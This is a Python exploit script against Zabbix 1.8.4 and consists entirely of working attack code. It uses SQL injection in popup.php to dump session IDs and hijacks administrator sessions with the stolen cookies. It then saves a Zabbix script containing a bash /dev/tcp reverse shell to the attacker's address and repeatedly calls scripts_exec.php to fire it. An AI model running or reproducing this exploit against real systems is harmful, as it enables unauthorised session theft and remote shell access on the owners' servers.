#!/usr/local/bin/python
#Zabbix 1.8.4

import re,urllib,urllib2,sys,requests
if (sys.argv)<4:
	print "Error Argv"
	sys.exit(-1)

host=sys.argv[1]
url = "http://%s/zabbix/popup.php?"%host
print url

proxies = {
'http': 'http://127.0.0.1:8080',
}
stop="%23"

atk=sys.argv[2]
ip=sys.argv[3]


login="http://%s/zabbix/" % host

for m in range(0,3):
	payload="dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=-1)) union select 1,group_concat(sessionid) from sessions WHERE userid=%s" %m
	URI="%s%s%s" %(url,payload,stop)
	g=requests.get(URI).text
	result = re.findall(r"([0-9a-f\d]{32})",g)
	for aaa in result:
#		print aaa
#		cookies="zbx_sessionid=%s" % aaa
		cookies="zbx_sessionid=%s" %aaa
		req=urllib2.Request(login)
		req.add_header('Cookie', cookies)
		response=urllib2.urlopen(req)
		data= response.read()
		if re.search('ERROR: Session terminated, re-login, please', data) or re.search('You are not logged in',data) or re.search('ERROR: No Permissions',data):
			print "Trying next token"
#			print data
#			break
		else:
			print "(+) Logged in"
			print "(+) Cookies used : %s" % aaa
			sid=aaa[16:36]
			print sid
			print "(+) Injecting Malicious Code in scripts.php"
			cookies = {'zbx_sessionid': '%s; cb_/zabbix/scripts.php_1=9; cb_/zabbix/scripts.php_parts=0' % aaa }
			headers = {'content-type': 'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0', 'Accept':'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5' , 'Accept-Encoding':'gzip, deflate', 'Referer':'http://192.168.11.124/zabbix/maps.php?sid=%s' % aaa}
			rev_url="http://%s/zabbix/scripts.php?action=1" % host
			rev_data="sid=%s"%sid
			rev_data1="&form_refresh=1&form=1&scriptid=3&form_refresh=1&name=WinSam&command=bash+-i+%3E%26+%2Fdev%2Ftcp%2F"+atk +"%2F"+ip+"+0%3E%261&usrgrpid=0&groupid=0&access=2&save=Save"
			final_data=rev_data+rev_data1
			requests.post(rev_url,data=final_data,cookies=cookies,headers=headers)
			print "(+) Trying to brute force the script id, check your lister on port %s" % ip
			for m in range(0,999):
				url_get_shell="http://%s/zabbix/scripts_exec.php?execute=1&hostid=10017&scriptid=3&sid=%s"% (host,sid)
				headers = {'User-Agent':'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language':'en-US,en;q=0.5' , 'Accept-Encoding':'gzip, deflate', 'Referer':'http://192.168.11.124/zabbix/scripts.php?form=1&scriptid=3'}
				cookies = {'zbx_sessionid': '%s' % aaa }
				haha=requests.get(url_get_shell,cookies=cookies,headers=headers,proxies=proxies)
